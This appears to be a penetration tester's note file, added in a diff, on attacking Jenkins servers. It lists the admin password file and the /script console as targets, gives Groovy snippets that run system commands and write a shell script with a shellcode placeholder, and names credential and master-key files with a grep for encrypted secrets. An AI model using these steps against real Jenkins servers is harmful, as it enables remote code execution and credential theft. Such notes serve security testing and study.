@@ -1,0 +1,49 @@
+JENKINS
+
+
+-automation tool with plugins built for Continuous Integration
+	--viz. build and test software continuously as devs integrate changes
+
+PortNo: 8080
+java -jar jenkins.war
+
+Sensitive Files:
+/root/.jenkins/secrets/initialAdminPassword
+
+
+target endpoints:
+/script
+
+
+
+GROOVY
+	-Groovy Script Console
+	-Groovy Pipeline Plugin
+		--buld instruction written in Groovy
+
+	Groovy Script Console
+Code execution:
+	execmd.groovy
+println "cmd.exe /c dir".execute().text
+println "uname -a".execute().text
+	writefile.groovy
+new File("/tmp/shell.sh").write("""
+echo "testing..."
+<shellcode>
+""")
+
+
+
+Jenkins Secrets
+	credentials.xml
+	jobs/.../build.xml
+Decryption Keys
+	secrets/master.key
+	secrets/hudson.util.Secret
+--if not found, search for renamed files from Jenkins webroot
+	grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
+
+
+
+References
+https://jenkins.io/
